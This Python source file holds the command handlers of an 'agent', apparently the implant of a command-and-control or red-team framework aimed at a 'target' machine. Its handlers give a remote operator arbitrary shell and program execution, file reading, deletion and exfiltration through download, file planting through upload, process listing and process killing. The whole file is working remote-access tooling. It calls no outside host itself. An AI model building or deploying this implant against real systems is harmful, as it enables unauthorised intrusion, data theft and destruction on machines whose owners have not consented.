"""Command handlers for the Python agent."""

import os
import platform
import shutil
import subprocess
from pathlib import Path


async def _cmd_pwd(args: dict) -> tuple[int, bytes, str]:
    try:
        return 1, os.getcwd().encode(), ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_cd(args: dict) -> tuple[int, bytes, str]:
    try:
        os.chdir(args["path"])
        return 1, os.getcwd().encode(), ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_ls(args: dict) -> tuple[int, bytes, str]:
    try:
        path = args.get("path", ".")
        entries = []
        for entry in sorted(Path(path).iterdir()):
            stat = entry.stat()
            entries.append(f"{'d' if entry.is_dir() else '-'} {stat.st_size:>12} {entry.name}")
        return 1, "\n".join(entries).encode(), ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_cat(args: dict) -> tuple[int, bytes, str]:
    try:
        data = Path(args["path"]).read_bytes()
        return 1, data, ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_mkdir(args: dict) -> tuple[int, bytes, str]:
    try:
        Path(args["path"]).mkdir(parents=True, exist_ok=True)
        return 1, b"", ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_rm(args: dict) -> tuple[int, bytes, str]:
    try:
        p = Path(args["path"])
        if p.is_dir():
            shutil.rmtree(p)
        else:
            p.unlink()
        return 1, b"", ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_mv(args: dict) -> tuple[int, bytes, str]:
    try:
        shutil.move(args["src"], args["dst"])
        return 1, b"", ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_cp(args: dict) -> tuple[int, bytes, str]:
    try:
        shutil.copy2(args["src"], args["dst"])
        return 1, b"", ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_whoami(args: dict) -> tuple[int, bytes, str]:
    try:
        import getpass
        user = getpass.getuser()
        return 1, user.encode(), ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_ps(args: dict) -> tuple[int, bytes, str]:
    try:
        result = subprocess.run(
            ["ps", "aux"] if platform.system() != "Windows" else ["tasklist"],
            capture_output=True, text=True, timeout=10
        )
        return 1, result.stdout.encode(), result.stderr


    except Exception as e:
        return 2, b"", str(e)


async def _cmd_kill(args: dict) -> tuple[int, bytes, str]:
    try:
        pid = int(args["pid"])
        os.kill(pid, 9)
        return 1, b"", ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_exec(args: dict) -> tuple[int, bytes, str]:
    try:
        program = args["program"]
        extra_args = args.get("args", "")
        cmd = [program] + (extra_args.split() if extra_args else [])
        result = subprocess.run(cmd, capture_output=True, timeout=60)
        return 1, result.stdout, result.stderr.decode(errors="replace")
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_shell(args: dict) -> tuple[int, bytes, str]:
    try:
        shell = True
        result = subprocess.run(
            args["command"], shell=shell, capture_output=True, timeout=60
        )
        return 1, result.stdout, result.stderr.decode(errors="replace")
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_upload(args: dict) -> tuple[int, bytes, str]:
    """Write data to path on target."""
    try:
        data = args.get("data", b"")
        if isinstance(data, str):
            import base64
            data = base64.b64decode(data)
        Path(args["path"]).write_bytes(data)
        return 1, b"", ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_download(args: dict) -> tuple[int, bytes, str]:
    try:
        data = Path(args["path"]).read_bytes()
        return 1, data, ""
    except Exception as e:
        return 2, b"", str(e)


async def _cmd_config(args: dict) -> tuple[int, bytes, str]:
    # Config update is handled in agent main loop by setting attributes
    return 1, b"", ""


async def _cmd_jobs(args: dict) -> tuple[int, bytes, str]:
    return 1, b"(no background jobs)", ""


async def _cmd_jobkill(args: dict) -> tuple[int, bytes, str]:
    return 2, b"", "Job kill not implemented"


async def _cmd_exit(args: dict) -> tuple[int, bytes, str]:
    return 1, b"", ""


# Command ID → handler mapping (matches 05_AGENT_SPEC.md IDs)
COMMAND_HANDLERS: dict[int, object] = {
    4:  _cmd_pwd,
    8:  _cmd_cd,
    12: _cmd_cp,
    14: _cmd_ls,
    17: _cmd_rm,
    18: _cmd_mv,
    21: _cmd_config,
    22: _cmd_whoami,
    24: _cmd_cat,
    27: _cmd_mkdir,
    33: _cmd_upload,
    34: _cmd_download,
    41: _cmd_ps,
    42: _cmd_kill,
    43: _cmd_exec,
    46: _cmd_jobs,
    47: _cmd_jobkill,
    50: _cmd_shell,
    99: _cmd_exit,
}
